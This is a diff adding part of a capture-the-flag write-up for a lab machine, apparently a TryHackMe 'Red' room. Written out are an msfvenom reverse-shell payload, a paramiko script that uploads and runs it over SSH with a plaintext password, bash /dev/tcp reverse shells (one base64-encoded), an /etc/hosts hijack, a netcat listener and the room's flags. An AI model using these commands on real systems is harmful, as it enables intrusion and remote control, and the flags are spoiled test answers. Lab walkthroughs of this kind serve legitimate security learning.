@@ -402,4 +402,237 @@ Connection to red.thm closed.
 - Files in `/tmp` can sometimes have less restrictive permissions, making them easier to manipulate.
 - `/dev/shm` This is a temporary filesystem (stored in memory) that is often used for sharing data between processes.
  
-# Undone
+## Crafting backdoor
+```bash
+$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.23.42.147" LPORT=4444 -f elf > revshell.elf
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 123 bytes
+Final size of elf file: 207 bytes
+```
+## Uploading backdoor 
+```bash
+$ python3 -m venv venv-ssh && source venv-ssh/bin/activate
+$ pip install paramiko 
+```
+```py
+import paramiko
+import os
+import logging
+
+# Enable Paramiko debugging
+paramiko.util.log_to_file("paramiko.log")
+
+# SSH connection details
+host = "red.thm"  
+port = 22   
+username = "blue"  
+password = 'sup3r_p@s$w0sup3r_p@s$w0'  
+local_file_path = "/home/kali/red/revshell.elf"   
+remote_file_path = "/tmp/revshell.elf"  
+
+ 
+if not os.path.exists(local_file_path):
+    print(f"Error: The file {local_file_path} does not exist.")
+    exit(1)
+
+try:
+    # Create SSH client
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    
+    # Connect to the remote host
+    print(f"Connecting to {host}...")
+    ssh.connect(host, port=port, username=username, password=password)
+    print("Connected successfully!")
+
+    # Create an SFTP session for file upload
+    sftp = ssh.open_sftp()
+    print(f"Uploading {local_file_path} to {remote_file_path}...")
+    sftp.put(local_file_path, remote_file_path)
+    print(f"File uploaded to {remote_file_path} successfully.")
+
+    # Make the uploaded file executable
+    print(f"Changing file permissions to make it executable: {remote_file_path}")
+    ssh.exec_command(f"chmod +x {remote_file_path}")
+    
+    # Run the uploaded file
+    print(f"Running the file: {remote_file_path}")
+    stdin, stdout, stderr = ssh.exec_command(f"{remote_file_path}")
+    
+    print("Command output:")
+    print(stdout.read().decode())   
+    print("Error output:")
+    print(stderr.read().decode())  
+    
+    # Close the SFTP session and SSH connection
+    sftp.close()
+    ssh.close()
+
+    print("SSH session closed.")
+
+except paramiko.AuthenticationException:
+    print("Authentication failed, please check your username/password.")
+except paramiko.SSHException as e:
+    print(f"SSH error: {e}")
+except Exception as e:
+    print(f"An error occurred: {e}")
+```
+```bash
+$ python3 backdoor.py 
+Connecting to red.thm...
+Connected successfully!
+Uploading /home/kali/red/revshell.elf to /tmp/revshell.elf...
+File uploaded to /tmp/revshell.elf successfully.
+Changing file permissions to make it executable: /tmp/revshell.elf
+Running the file: /tmp/revshell.elf
+Command output:
+
+Error output:
+
+SSH session closed.
+Exception ignored in: <function BufferedFile.__del__ at 0x7f7bcc90ac00>
+Traceback (most recent call last):
+...
+...
+```
+```bash
+meterpreter > sysinfo 
+Computer     : 10.10.99.103
+OS           : Ubuntu 20.04 (Linux 5.4.0-124-generic)
+Architecture : x64
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter > shell
+Process 2020 created.
+Channel 1 created.
+whoami
+blue
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+blue@red:~$ id 
+id 
+uid=1000(blue) gid=1000(blue) groups=1000(blue)
+blue@red:~$ La la la la la la la la la la la la la la la la
+There is no way you are going to own this machine
+Say Bye Bye to your Shell Blue and that password
+Fine fine, just run sudo -l and then enter this password WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==
+
+[*] 10.10.99.103 - Meterpreter session 1 closed.  Reason: Died
+```
+```bash
+$ echo "WW91IHJlYWxseSBzdWNrIGF0IHRoaXMgQmx1ZQ==" | base64 -d 
+You really suck at this Blue 
+```
+## Linpeas
+![writable](writable.png)
+
+## Cron (pspy)
+```bash
+# kali terminal
+$ python3 -m http.server 8080 
+
+# target terminal 
+$ wget http://ip:8080/pspy && ./pspy > pspy_result.txt 
+```
+```bash
+# kali 
+$ scp -i blue blue@red.thm:/tmp/pspy.txt . 
+```
+## Pspy 
+```bash
+$ cat pspy.txt | grep UID=1001
+
+REDACTED CMD: UID=1001  PID=111359 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+REDACTED CMD: UID=1001  PID=111336 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+REDACTED CMD: UID=1001  PID=111536 | sh 
+REDACTED CMD: UID=1001  PID=111533 | /bin/sh -c echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh 
+REDACTED CMD: UID=1001  PID=111538 | sh 
+REDACTED CMD: UID=1001  PID=111545 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+REDACTED CMD: UID=1001  PID=111653 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+REDACTED CMD: UID=1001  PID=111651 | 
+REDACTED CMD: UID=1001  PID=111649 | sh 
+REDACTED CMD: UID=1001  PID=111645 | /bin/sh -c echo YmFzaCAtYyAnbm9odXAgYmFzaCAtaSA+JiAvZGV2L3RjcC9yZWRydWxlcy50aG0vOTAwMSAwPiYxICYn | base64 -d | sh 
+REDACTED CMD: UID=1001  PID=111683 | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
+```
+## Hijacking Host file
+```bash
+blue@red:~$ echo "10.23.42.147 redrules.thm" | tee -a /etc/hosts
+10.23.42.147 redrules.thm
+
+blue@red:~$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 red
+192.168.0.1 redrules.thm
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouter
+10.23.42.147 redrules.thm
+
+blue@red:~$ 
+```
+## Listener
+```bash
+$ time rlwrap -cAr nc -lvnp 9001                   
+listening on [any] 9001 ...
+connect to [10.23.42.147] from (UNKNOWN) [10.10.99.103] 57952
+bash: cannot set terminal process group (112780): Inappropriate ioctl for device
+bash: no job control in this shell
+red@red:~$ 
+
+real	49.12s
+user	0.00s
+sys	0.01s
+cpu	0%                  
+```
+```bash
+red@red:~$ ls -al 
+ls -al 
+total 36
+drwxr-xr-x 4 root red  4096 Aug 17  2022 .
+drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
+lrwxrwxrwx 1 root root    9 Aug 14  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 red  red   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 red  red  3771 Feb 25  2020 .bashrc
+drwx------ 2 red  red  4096 Aug 14  2022 .cache
+-rw-r----- 1 root red    41 Aug 14  2022 flag2
+drwxr-x--- 2 red  red  4096 Aug 14  2022 .git
+-rw-r--r-- 1 red  red   807 Aug 14  2022 .profile
+-rw-rw-r-- 1 red  red    75 Aug 14  2022 .selected_editor
+-rw------- 1 red  red     0 Aug 17  2022 .viminfo
+ 
+red@red:~/.git$ ls -al
+ls -al
+ 
+# setuid permissions
+-rwsr-xr-x 1 root root 31032 Aug 14  2022 pkexec
+
+red@red:~/.git$ ./pkexec 
+./pkexec 
+pkexec --version |
+       --help |
+       --disable-internal-agent |
+       [--user username] PROGRAM [ARGUMENTS.    ..]
+
+See the pkexec manual page for more details.
+
+red@red:~/.git$ ./pkexec  --version
+./pkexec  --version
+pkexec version 0.105
+
+```
+
+## Flags
+```bash
+# flag1
+THM{Is_thAt_all_y0u_can_d0_blU3?}
+
+# flag 2
+THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
+
+# root 
+```
